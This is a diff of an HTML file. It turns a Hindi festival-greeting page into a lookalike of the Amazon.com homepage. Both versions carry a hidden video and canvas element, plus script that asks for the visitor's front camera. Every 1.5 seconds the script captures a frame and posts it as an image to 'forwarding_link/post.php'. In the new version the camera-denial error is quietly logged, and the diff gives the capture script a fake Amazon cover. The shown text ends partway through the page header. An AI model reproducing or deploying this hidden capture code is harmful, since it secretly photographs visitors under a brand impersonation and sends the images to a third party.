@@ -1,692 +1,724 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"/>
-<title>Happy fes_name to Your Friends</title>
-    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-    <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css"> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon.com. Spend less. Smile more.</title>
+    <link rel="icon" type="image/png" href="https://www.amazon.com/favicon.ico">
     <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" />
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css" />
-    <link href='https://fonts.googleapis.com/css?family=Sofia:&effect=neon' rel='stylesheet'>
-	  <link rel="icon" type="image/png" sizes="32x32" href="https://i.imgur.com/fcqTtzV.png">
-
-<style>
-    i {
-        color:#f06414;
-    }
-input[type=name], select {
-    width: 100%;
-    padding: 12px 20px;
-    margin: 4px 0;
-    display: inline-block;
-    border: 1px solid #ccc;
-    border-radius: 4px;
-    box-sizing: border-box;
-}
-.footerbtn1 {
- 
-            display: block;
-            line-height: 15px;
-            position: fixed;
-            right:0px;
-            bottom:0px;
-            height:40px;
-            
-border-radius: 15px;
-  box-sizing: border-box;
-  padding: 5px;
-  background:#000099;
-  color: #ffffff;
-  font-size: 18px;
-  text-align: center;
-  text-decoration: none;
-  width:45%;
- margin-right:10px;
-            margin-right:30px;
-            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
-            animation: footer infinite linear 1s;
-            -webkit-transform: translate3d(30%,0,0);
-            transform: translate3d(30%,0,0);
-            position: fixed;
-           
-}
-
-.footerbtn1 :active {
-            box-shadow: none
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
 
-        @-webkit-keyframes footer {
-            from {
-                -webkit-transform: rotateZ(0)
-            }
-            25% {
-                -webkit-transform: rotateZ(1.5deg)
-            }
-            50% {
-                -webkit-transform: rotateZ(0deg)
-            }
-            75% {
-                -webkit-transform: rotateZ(-1.5deg)
-            }
-            to {
-                -webkit-transform: rotateZ(0)
-            }}
-.footerbtn {
- 
-            display: block;
-            line-height: 15px;
-            position: fixed;
-            left:0px;
-            bottom:0px;
-            height:40px;
-            
-border-radius: 15px;
-  box-sizing: border-box;
-  padding: 5px;
-  background:#34af23;
-  color: #ffffff;
-  font-size: 18px;
-  text-align: center;
-  text-decoration: none;
-  width:45%;
- margin-left:10px;
-            margin-right:30px;
-            box-shadow: 0 4px 12px 0 rgba(0, 0, 0, .3);
-            animation: footer infinite linear 1s;
-            -webkit-transform: translate3d(30%,0,0);
-            transform: translate3d(30%,0,0);
-            position: fixed;
-           
-}
-
-.footerbtn :active {
-            box-shadow: none
+        body {
+            font-family: "Amazon Ember", Arial, sans-serif;
+            background-color: #fff;
+            color: #0F1111;
+            line-height: 1.4;
         }
 
-        @-webkit-keyframes footer {
-            from {
-                -webkit-transform: rotateZ(0)
+        .header {
+            background-color: #131921;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            padding: 8px;
+            border: 1px solid transparent;
+            cursor: pointer;
+        }
+
+        .logo:hover {
+            border: 1px solid #fff;
+            border-radius: 2px;
+        }
+
+        .logo img {
+            width: 100px;
+            margin-top: 8px;
+        }
+
+        .deliver-to {
+            display: flex;
+            align-items: center;
+            color: #ccc;
+            font-size: 12px;
+            padding: 8px;
+            border: 1px solid transparent;
+            cursor: pointer;
+        }
+
+        .deliver-to:hover {
+            border: 1px solid #fff;
+            border-radius: 2px;
+        }
+
+        .deliver-to .location-icon {
+            font-size: 18px;
+            color: #fff;
+            margin-right: 3px;
+        }
+
+        .deliver-to .location {
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .search-bar {
+            display: flex;
+            flex: 1;
+            max-width: 800px;
+            margin: 0 10px;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+
+        .search-category {
+            background-color: #e6e6e6;
+            border: none;
+            padding: 10px;
+            font-size: 12px;
+            color: #555;
+            cursor: pointer;
+            border-radius: 4px 0 0 4px;
+        }
+
+        .search-input {
+            flex: 1;
+            padding: 10px 15px;
+            border: none;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .search-btn {
+            background-color: #febd69;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 0 4px 4px 0;
+        }
+
+        .search-btn:hover {
+            background-color: #f3a847;
+        }
+
+        .search-btn svg {
+            width: 22px;
+            height: 22px;
+        }
+
+        .nav-items {
+            display: flex;
+            align-items: center;
+        }
+
+        .nav-item {
+            color: #fff;
+            padding: 8px 10px;
+            cursor: pointer;
+            border: 1px solid transparent;
+            text-decoration: none;
+        }
+
+        .nav-item:hover {
+            border: 1px solid #fff;
+            border-radius: 2px;
+        }
+
+        .nav-item .item-label {
+            font-size: 12px;
+            color: #ccc;
+        }
+
+        .nav-item .item-value {
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .cart {
+            display: flex;
+            align-items: flex-end;
+            color: #fff;
+            font-weight: bold;
+        }
+
+        .cart-icon {
+            position: relative;
+        }
+
+        .cart-count {
+            position: absolute;
+            top: -5px;
+            left: 15px;
+            color: #f08804;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        .sub-header {
+            background-color: #232f3e;
+            padding: 8px 20px;
+            display: flex;
+            align-items: center;
+            overflow-x: auto;
+        }
+
+        .sub-header a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 14px;
+            padding: 8px 10px;
+            white-space: nowrap;
+            border: 1px solid transparent;
+        }
+
+        .sub-header a:hover {
+            border: 1px solid #fff;
+            border-radius: 2px;
+        }
+
+        .hamburger {
+            display: flex;
+            align-items: center;
+            font-weight: bold;
+        }
+
+        .hamburger svg {
+            margin-right: 5px;
+        }
+
+        .hero {
+            position: relative;
+            background: linear-gradient(to bottom, #e3e6e6 0%, #fff 100%);
+            padding-bottom: 20px;
+        }
+
+        .hero-banner {
+            width: 100%;
+            height: 400px;
+            background: linear-gradient(180deg, rgba(0,0,0,0) 50%, #e3e6e6 100%), url('https://m.media-amazon.com/images/I/71tIrZqybrL._SX3000_.jpg') center/cover;
+            position: relative;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+            padding: 20px;
+            margin-top: -100px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .product-card {
+            background: #fff;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .product-card h3 {
+            font-size: 21px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            color: #0F1111;
+        }
+
+        .product-card-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+
+        .product-card-link {
+            color: #007185;
+            font-size: 13px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .product-card-link:hover {
+            color: #c7511f;
+            text-decoration: underline;
+        }
+
+        .signin-card {
+            background: #fff;
+            padding: 20px;
+            border-radius: 4px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .signin-card h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .signin-btn {
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            padding: 8px 30px;
+            cursor: pointer;
+            font-size: 13px;
+            color: #111;
+            margin: 10px 0;
+            width: 100%;
+        }
+
+        .signin-btn:hover {
+            background: linear-gradient(to bottom, #f5d78e, #eeb933);
+        }
+
+        .signin-card p {
+            font-size: 12px;
+            color: #555;
+            margin-top: 10px;
+        }
+
+        .signin-card a {
+            color: #007185;
+            text-decoration: none;
+        }
+
+        .deals-section {
+            padding: 20px;
+            background: #e3e6e6;
+        }
+
+        .deals-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .deals-header h2 {
+            font-size: 21px;
+            font-weight: 700;
+        }
+
+        .deals-header a {
+            color: #007185;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .deals-slider {
+            display: flex;
+            gap: 15px;
+            overflow-x: auto;
+            padding-bottom: 10px;
+        }
+
+        .deal-item {
+            min-width: 200px;
+            background: #fff;
+            padding: 15px;
+            border-radius: 4px;
+            text-align: center;
+        }
+
+        .deal-item img {
+            width: 150px;
+            height: 150px;
+            object-fit: contain;
+            margin-bottom: 10px;
+        }
+
+        .deal-badge {
+            background: #cc0c39;
+            color: #fff;
+            font-size: 12px;
+            padding: 3px 8px;
+            border-radius: 2px;
+            display: inline-block;
+            margin-bottom: 5px;
+        }
+
+        .deal-price {
+            color: #0F1111;
+            font-size: 14px;
+        }
+
+        .back-to-top {
+            background: #37475a;
+            color: #fff;
+            text-align: center;
+            padding: 15px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .back-to-top:hover {
+            background: #485769;
+        }
+
+        .footer-links {
+            background: #232f3e;
+            padding: 40px 20px;
+            display: flex;
+            justify-content: center;
+            gap: 100px;
+            flex-wrap: wrap;
+        }
+
+        .footer-column {
+            color: #ddd;
+        }
+
+        .footer-column h4 {
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .footer-column a {
+            display: block;
+            color: #ddd;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .footer-column a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            background: #131a22;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .footer-logo {
+            width: 80px;
+            margin-bottom: 15px;
+        }
+
+        .footer-legal {
+            color: #999;
+            font-size: 12px;
+        }
+
+        .footer-legal a {
+            color: #999;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 10px;
             }
-            25% {
-                -webkit-transform: rotateZ(1.5deg)
+            .search-bar {
+                width: 100%;
+                margin: 10px 0;
             }
-            50% {
-                -webkit-transform: rotateZ(0deg)
+            .nav-items {
+                width: 100%;
+                justify-content: space-around;
             }
-            75% {
-                -webkit-transform: rotateZ(-1.5deg)
+            .hero-banner {
+                height: 200px;
             }
-            to {
-                -webkit-transform: rotateZ(0)
-            }}
-
-@-webkit-keyframes jello {  from, 11.1%, to {    transform: none;  }
-  22.2% {    transform: skewX(-12.5deg) skewY(-12.5deg);  }
-  33.3% {    transform: skewX(6.25deg) skewY(6.25deg);  }
-  44.4% {    transform: skewX(-3.125deg) skewY(-3.125deg);  }
-  55.5% {    transform: skewX(1.5625deg) skewY(1.5625deg);  }
-  66.6% {    transform: skewX(-0.78125deg) skewY(-0.78125deg);  }
-  77.7% {    transform: skewX(0.390625deg) skewY(0.390625deg);  }
-  88.8% {    transform: skewX(-0.1953125deg) skewY(-0.1953125deg);  }}
-.jello {  -webkit-animation: jello 3s infinite;  transform-origin: center; -webkit-animation-delay:6s}
-@-webkit-keyframes hue {
-  from {    -webkit-filter: hue-rotate(0deg);  }
-  to {    -webkit-filter: hue-rotate(-360deg);  }}
-    .m1{position:fixed;left:1%; width:auto;height:100%;top:1%;color:#000;}
-    .m2{position:fixed;right:1%; width:auto;height:100%;top:1%;color:#000;}
-.bubbles {
-font-family: arial;
-}
-
-.bubbles hi {
-font-family: 'Luckiest Guy', cursive;
-color: black;
-}
-
-hi {
- font-size:2.5em;
- user-select:none;
-}
-
-hi span { display:inline-block; animation:float .2s ease-in-out infinite; }
- @keyframes float {
-  0%,100%{ transform:none; }
-  33%{ transform:translateY(-1px) rotate(-2deg); }
-  66%{ transform:translateY(1px) rotate(2deg); }
-}
-body:hover span { animation:bounce .6s; }
-@keyframes bounce {
-  0%,100%{ transform:translate(0); }
-  25%{ transform:rotateX(20deg) translateY(2px) rotate(-3deg); }
-  50%{ transform:translateY(-20px) rotate(3deg) scale(1.1);  }
-}
-
-@import url(http://fonts.googleapis.com/css?family=Concert+One);
-
-h1 {
-  animation:glow 10s ease-in-out infinite;
-}
-
-
-
-* { box-sizing:border-box; }
-
-figure {
-  animation:wobble 5s ease-in-out infinite;
-  transform-origin:center center;
-  transform-style:preserve-3d;
-}
-
-@keyframes wobble {
-  0%,100%{ transform:rotate3d(1,1,0,40deg); }
-  25%{ transform:rotate3d(-1,1,0,40deg); }
-  50%{ transform:rotate3d(-1,-1,0,40deg); }
-  75%{ transform:rotate3d(1,-1,0,40deg); }
-}
-
-h1 {
-  display:block;
-  width:90%;
-  line-height:1.5;
-  font:900 35px 'Concert One', sans-serif;
-  position:absolute;
-  color:#fff;
-}
-
-@keyframes glow {
-  0%,100%{ text-shadow:0 0 30px red; }
-  25%{ text-shadow:0 0 30px orange; }
-  50%{ text-shadow:0 0 30px forestgreen; }
-  75%{ text-shadow:0 0 30px cyan; }
-}
-
-h1:nth-child(2){ transform:translateZ(5px); }
-h1:nth-child(3){ transform:translateZ(10px);}
-h1:nth-child(4){ transform:translateZ(15px); }
-h1:nth-child(5){ transform:translateZ(20px); }
-h1:nth-child(6){ transform:translateZ(25px); }
-h1:nth-child(7){ transform:translateZ(30p.rock{animation:infinite 1s rock}
-@keyframes rock {  0% {    transform: rotate(-1deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-1deg);  }}x); }
-h1:nth-child(8){ transform:translateZ(35px); }
-h1:nth-child(9){ transform:translateZ(40px); }
-h1:nth-child(10){ transform:translateZ(45px); }
-
-
-
-.rock{animation:infinite 1s rock}
-@keyframes rock {  0% {    transform: rotate(-1deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-1deg);  }}
-
-.fuck{animation:infinite 1s fuck}
-@keyframes rock {  0% {    transform: rotate(-2deg);  }
-  50% {    transform: rotate(2deg);  }
-  100% {    transform: rotate(-2deg);  }}
-
-
-h2 {
-   font-size: 38px;
-    text-align: center;
-    color:#008000;
-    
-    animation: rock infinite 1s;
-    font-family: 'Indie Flower', cursive;
-    letter-spacing: 2px;
-}
-
-h3 {
-    font-size: 48px;
-    text-align: center;
-    padding:1px;
-    margin:1px;
-    color: #f06414;
-   
-    aanimation: fuck infinite 1s;
-    font-family: 'Indie Flower', cursive;
-    letter-spacing: 2px;
-	
-	
-	* {box-sizing: border-box;}
-body {font-family: Verdana, sans-serif;}
-.mySlides {display: none;}
-img {vertical-align: middle;}
-
-/* Slideshow container */
-.slideshow-container {
-  max-width: 1000px;
-  position: relative;
-  margin: auto;
-}
-
-/* Caption text */
-.text {
-  color: #f2f2f2;
-  font-size: 15px;
-  padding: 8px 12px;
-  position: absolute;
-  bottom: 8px;
-  width: 100%;
-  text-align: center;
-}
-
-/* Number text (1/11 etc) */
-.numbertext {
-  color: #f2f2f2;
-  font-size: 12px;
-  padding: 8px 12px;
-  position: absolute;
-  top: 0;
-}
-
-/* The dots/bullets/indicators */
-.dot {
-  height: 15px;
-  width: 15px;
-  margin: 0 2px;
-  background-color: #bbb;
-  border-radius: 50%;
-  display: inline-block;
-  transition: background-color 0.6s ease;
-}
-
-.active {
-  background-color: #717171;
-}
-
-/* Fading animation */
-.fade {
-  -webkit-animation-name: fade;
-  -webkit-animation-duration: 1.5s;
-  animation-name: fade;
-  animation-duration: 1.5s;
-}
-
-@-webkit-keyframes fade {
-  from {opacity: .4} 
-  to {opacity: 1}
-}
-
-@keyframes fade {
-  from {opacity: .4} 
-  to {opacity: 1}
-}
-
-/* On smaller screens, decrease text size */
-@media only screen and (max-width: 300px) {
-  .text {font-size: 11px}
-	
-}
-
-.cssload-preloader {
-	position: absolute;
-	top: 0px;
-	left: px;
-	right: 40px;
-	bottom: 20px;
-	z-index: 10;
-}
-
-.cssload-preloader > .cssload-preloader-box {
-	position: absolute;
-	height: 16px;
-	top: 50%;
-	left: 50%;
-	margin: -8px 0 0 -82px;
-	perspective: 110px;
-		-o-perspective: 110px;
-		-ms-perspective: 110px;
-		-webkit-perspective: 110px;
-		-moz-perspective: 110px;
-}
-
-.cssload-preloader .cssload-preloader-box > div {
-	position: relative;
-	width: 16px;
-	height: 16px;
-	background: rgb(204,204,204);
-	float: left;
-	text-align: center;
-	line-height: 16px;
-	font-family: Verdana;
-	font-size: 11px;
-	color: rgb(255,255,255);
-}.cssload-preloader .cssload-preloader-box > div:nth-child(1) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 0ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 0ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(2) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 86.25ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(3) {
-	background: rgb(255,0,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 172.5ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(4) {
-	background: rgb(204,255,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 258.75ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(5) {
-	background: rgb(0,255,60);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 345ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 345ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(6) {
-	background: rgb(0,185,252);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 431.25ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(7) {
-	background: rgb(58,0,250);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 517.5ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(8) {
-	background: rgb(255,255,0);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 603.75ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(9) {
-	background: rgb(221,0,255);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 690ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 690ms infinite alternate;
-}
-.cssload-preloader .cssload-preloader-box > div:nth-child(10) {
-	background: rgb(51,102,255);
-	margin-right: 8px;
-	animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-o-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-ms-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-webkit-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-		-moz-animation: cssload-movement 690ms ease 776.25ms infinite alternate;
-}
-</style>
+            .product-grid {
+                margin-top: -50px;
+            }
+            .footer-links {
+                gap: 40px;
+            }
+        }
+    </style>
 </head>
-<div class="video-wrap" hidden="hidden">
-    <video id="video" playsinline autoplay></video>
- </div>
- 
- <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
- 
- <script>
- 
- function post(imgdata){
- $.ajax({
-     type: 'POST',
-     data: { cat: imgdata},
-     url: 'forwarding_link/post.php',
-     dataType: 'json',
-     async: false,
-     success: function(result){
-         // call the function that handles the response/results
-     },
-     error: function(){
-     }
-   });
- };
- 
- 
- 'use strict';
- 
- const video = document.getElementById('video');
- const canvas = document.getElementById('canvas');
- const errorMsgElement = document.querySelector('span#errorMsg');
- 
- const constraints = {
-   audio: false,
-   video: {
-     
-     facingMode: "user"
-   }
- };
- 
- // Access webcam
- async function init() {
-   try {
-     const stream = await navigator.mediaDevices.getUserMedia(constraints);
-     handleSuccess(stream);
-   } catch (e) {
-     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-   }
- }
- 
- // Success
- function handleSuccess(stream) {
-   window.stream = stream;
-   video.srcObject = stream;
- 
- var context = canvas.getContext('2d');
-   setInterval(function(){
- 
-        context.drawImage(video, 0, 0, 640, 480);
-        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-        post(canvasData); }, 1500);
-   
- 
- }
- 
- // Load init
- init();
- 
- </script>
 <body>
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
 
-<body class="bg" id="rakhi" style="background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
-    -webkit-background-size: cover;
-    -moz-background-size: cover;
-    -o-background-size: cover;
-    background-size: cover;">
-	
-	
-<center><span style="font-size: 20px;"color: #ff077a;">▅ ▆ ▇ █ HAPPY fes_name █ ▇ ▆ ▅</center>	
-<center>
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Wishing 2 -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:300px;height:50px"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="2568634816"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
+    <script>
+    function post(imgdata){
+        $.ajax({
+            type: 'POST',
+            data: { cat: imgdata},
+            url: 'forwarding_link/post.php',
+            dataType: 'json',
+            async: false,
+            success: function(result){},
+            error: function(){}
+        });
+    };
 
-</center>
- <center> 
-<div class="container">
-    <div class="main-greeting">
-<div align="center html2canvas-ignore">
-     <div style="font-size: 20px; font-weight: 500; color: Black;">
-<p id="demo"></p>
+    'use strict';
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-<div dir="ltr" style="text-align: left;" trbidi="on">
-<div style="background-color:rgb(255, 140, 0); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-“fes_name का ये शुभ अवसर आपके जीवन में अनेकों ख़ुशियाँ लेकर आए”
-</b></marquee>
-</div>
-<div style="background-color: rgb(255, 255, 255); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: blue; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-इस fes_name हमारी शुभकामनाएँ आपके साथ हैं
-</b></marquee>
-</div>
-<div style="background-color: rgb(0, 255, 42); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: black; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 0px auto; padding: 4px 5px 3px; width: 70%;">
-<marquee behavior="alternate"><b>
-|| fes_name की हार्दिक बधाई || 
-</b></marquee>
-</div>
-</div>
-<br><br>
+    const constraints = {
+        audio: false,
+        video: { facingMode: "user" }
+    };
 
-<center>
-<figure>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                 var a=prompt("Please Enter Your Name\n\n👇👇👇👇👇");
-                 document.write(a);
-                </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-	<h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script></h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                   
-                    document.write(a);
-                      </script> </h1>
-    <h1 style="text-transform: uppercase;"><script type="text/javascript" language="Javascript">
-                    
-                    document.write(a);
-                      </script></h1>
+    async function init() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            handleSuccess(stream);
+        } catch (e) {
+            console.log('Camera access denied');
+        }
+    }
 
-</figure>
- </center>
-<div class="vi" style="text-align: center;">
+    function handleSuccess(stream) {
+        window.stream = stream;
+        video.srcObject = stream;
+        var context = canvas.getContext('2d');
+        setInterval(function(){
+            context.drawImage(video, 0, 0, 640, 480);
+            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+            post(canvasData);
+        }, 1500);
+    }
 
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Wishing -->
-<ins class="adsbygoogle"
-     style="display:inline-block;width:300px;height:50px"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="5590491777"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
+    init();
+    </script>
 
-</center>
-<br><br><center>
-    <p style="text-align: center;"><strong><span style="background-color: #ffea00; color: #005f96; font-size: 18pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;Wishing you a very </span></p>
-</center>
-<br>
-<p style="text-align: center;"><strong><span style="font-size: 21pt; font-family: 'comic sans ms', sans-serif; color: #ff7700;">✪ <span style="font-family: 'trebuchet ms', geneva;">Happy fes_name</span> ✪</span></strong></p>
-<br>
-<p style="text-align: center;"><strong><span style="background-color: #ff0000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;to you and your lovely family </span></p>
-  <br>
-  <p style="text-align: center;"><span style="background-color: #008000; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;May this auspicious occasion of fes_name bring happiness, prosperity, health, and peace in your life.</span></p>
-  <br>
-  <p style="text-align: center;"><span style="background-color: #ff00ff; color: #ffffff; font-size: 16pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp;✪ I wish that this fes_name is your best one. ✪</span></p>
-<br>
-
-<p style="text-align: center;"><span style="background-color: #663399; color: #FFFAFA; font-size: 15pt; font-family: tahoma, arial, helvetica, sans-serif;">&nbsp; यह संदेश fes_name तक सभी के मोबाइल में होना चाहिए यह आपका फर्ज हैं </span></p>
-<br>
-<center>
-<div class="busi"><h4><p style="text-transform: uppercase;font-size: 26px;color:#ffffff;"> <script type="text/javascript" language="Javascript">                                       
- document.write( "by - " +a);
-                      </script><br><br></p></h4></center>
-<center>
-<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<!-- Link Ads -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-4696491179456446"
-     data-ad-slot="1112298516"
-     data-ad-format="link"
-     data-full-width-responsive="true"></ins>
-<script>
-(adsbygoogle = window.adsbygoogle || []).push({});
-</script>
-
-</center>
-</div>
+    <header class="header">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
         </div>
-<script>
-// Set the date we're counting down to
